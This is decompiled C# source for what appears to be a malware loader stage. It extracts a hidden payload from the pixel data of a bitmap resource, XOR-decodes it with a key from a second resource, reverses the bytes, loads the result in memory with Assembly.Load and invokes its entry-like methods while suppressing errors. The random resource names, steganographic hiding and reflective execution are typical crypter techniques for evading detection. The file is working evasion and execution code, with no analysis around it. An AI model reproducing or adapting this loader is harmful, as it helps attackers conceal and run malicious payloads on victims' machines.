using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace NS;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Thread.Sleep(0);
			ResourceManager resourceManager = new ResourceManager("ga", typeof(Program).Assembly);
			Bitmap val = (Bitmap)resourceManager.GetObject("bSAujLVrHvQnKh");
			Color[] array = new Color[((Image)val).get_Width() * ((Image)val).get_Height()];
			int num = 0;
			for (int i = 0; i < ((Image)val).get_Height(); i++)
			{
				for (int j = 0; j < ((Image)val).get_Width(); j++)
				{
					ref Color reference = ref array[num++];
					reference = val.GetPixel(j, i);
				}
			}
			int num2 = array[0].B + 256 * array[0].G + 65536 * array[0].R + 16777216 * array[0].A;
			byte[] array2 = new byte[num2];
			Color color = array[1];
			num = 1;
			for (int k = 0; k < num2; k++)
			{
				switch (k % 4)
				{
				case 0:
					array2[k] = color.B;
					break;
				case 1:
					array2[k] = color.G;
					break;
				case 2:
					array2[k] = color.R;
					break;
				case 3:
					array2[k] = color.A;
					color = array[++num];
					break;
				}
			}
			byte[] array3 = new byte[0];
			MethodInfo[] methods = typeof(ResourceManager).GetMethods();
			foreach (MethodInfo methodInfo in methods)
			{
				if (methodInfo.Name == "GetObject" && methodInfo.GetParameters().Length == 1)
				{
					array3 = (byte[])methodInfo.Invoke(resourceManager, new object[1] { "GCWGuJaWXZboAJc" });
				}
			}
			for (int k = 0; k < array2.Length; k++)
			{
				for (int m = 0; m < array3.Length; m++)
				{
					array2[k] = (byte)(array2[k] ^ array3[m]);
				}
			}
			byte[] array4 = new byte[array2.Length];
			for (int k = 0; k < array2.Length; k++)
			{
				array4[k] = array2[k];
			}
			for (int k = 0; k < array2.Length; k++)
			{
				array2[k] = array4[array4.Length - k - 1];
			}
			Assembly assembly = Assembly.Load(array2);
			Type[] types = assembly.GetTypes();
			foreach (Type type in types)
			{
				methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					try
					{
						if ((object)methodInfo.GetParameters()[0].ParameterType == typeof(string[]) && (object)methodInfo.ReturnType == typeof(void))
						{
							try
							{
								methodInfo.Invoke(null, new object[1] { args });
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}
}
